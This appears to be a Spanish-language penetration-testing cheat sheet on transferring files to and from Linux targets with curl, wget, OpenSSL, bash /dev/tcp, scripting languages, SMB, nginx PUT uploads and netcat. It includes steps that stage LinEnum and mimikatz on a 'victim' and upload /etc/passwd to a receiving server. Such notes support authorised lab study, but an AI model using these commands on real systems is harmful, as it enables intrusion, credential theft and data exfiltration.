# File Transfer - Linux

## wget / curl

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

```bash
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

## OpenSSL

- Crear certificado
  
```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

- Iniciar el servidor

```bash
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

- Descargar el archivo
  
```bash
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

## Bash /dev/tcp

- Conectar al servidor web del objetivo

```bash
exec 3<>/dev/tcp/10.10.10.32/80
```

- Efectuar un http request

```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

- Imprimir la respuesta

```
cat <&3
```

## PHP

- file_get_contents()

```bash
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

- fopen()

```bash
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

- php-curl

```bash
php -r '$rfile = "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"; $lfile = "LinEnum.sh"; $fp = fopen($lfile, "w+"); $ch = curl_init($rfile); curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_TIMEOUT, 20); curl_exec($ch);'
```

## Python

- Python 2

```python
import urllib
urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")
```

- Python 3

```python
import urllib.request
urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")
```

## Ruby

```ruby
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

## Perl

```bash
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");
```

## Go

```go
package main

import (
	 "os"
     "io"
     "net/http"
)

func main() {
     lfile, err := os.Create("LinEnum.sh")
     _ = err
     defer lfile.Close()

     rfile := "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"
     response, err := http.Get(rfile)
     defer response.Body.Close()

     io.Copy(lfile, response.Body)
}
```

## scp

- upload

```bash
scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip
```

- download

```bash
scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe
```

## Catching Files over HTTP/SMB

### Nginx

1. Crear directorio para Uploads y asignarlo a www-data

```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

2. Crear archivo de configuración

```bash
server {
	listen 9001;
	
	location /SecretUploadDirectory/ {
		root	/var/www/uploads;
		dav_methods	PUT;
	}
}
```

3. Una liga de nuestro sitio a sites-enabled
```
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

4. Iniciar nginx

```bash
sudo systemctl restart nginx.service
```

5. Si tenemos error
   
Los errores van a `/var/log/nginx/error.log`

```bash
tail -2 `/var/log/nginx/error.log`
```

- Si la escucha ya esta en 80 eliminar el archivo de configuracion por defecto de ngnix

```bash
ss -lnpt | grep `80`
sudo rm /etc/nginx/sites-enabled/default
```

- Probamos subiendo un archivo

```bash
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
tail -1 /var/www/upload/SecretUploadDirectory/users.txt 
```

## SMB

- Impacket SMBServer

- Sintaxis

```bash
smbserver.py -smb2support <share name> <location>
```

- Creamos carpeta compartida
  
``` bash
mkdir Transfers && cd Transfers
smbserver.py -smb2support FileTransfer $(pwd)
```

```bash
smbserver.py -user USERNAME -password PASSWORD FileTransfer $(pwd)
```

- Listamos carpetas compartidas
  
```bash
sudo smbclient -L 127.0.0.1
```

## Otros metodos

### Web Servers

- Python 2
  
```bash
python -m SimpleHTTPServer 8080
```

- Pyhon 3
  
```bash
python3 -m http.server 8080
```

- Ruby

```bash
ruby -run -ehttpd . -p8080
```

- Php
  
```bash
php -S 0.0.0.0:8080
```

- Socat
  
```bash
socat TCP-LISTEN:8080,reuseaddr,fork
```

### SMB


- copy / xcopy

```powershell
xcopy \\10.10.10.132\share\nc.exe nc.exe
copy C:\Temp\nc.exe \\10.10.10.132\c$\Temp\nc.exe
```

- Mapear y montar drives

```cmd
net use Q: \\10.10.10.132\share
pushd \\10.10.10.132\share
mklink /D share \\10.10.10.132\share
```

```bash
smbclient //10.10.10.132/share -U username -W domain
```

### Netcat

- Desde la victima

```bash
nc -nlvp 8000 > mimikatz.exe
nc -nv 10.10.10.132 8000 <mimikatz.exe
```

- Desde el atacante

```bash
nc -nv 10.10.10.32 8000 > mimikatz.exe
nc -nlvp 8000 <mimikatz.exe
```

- Otra forma

```bash
nc -lvnp 80 <LinEnum.sh
cat < /dev/tcp/10.10.10.32/80 > LinEnum.sh
```



## Python FTP Server

```bash
python3 -m pyftpdlib --user=tmp --password=tmp -w
```
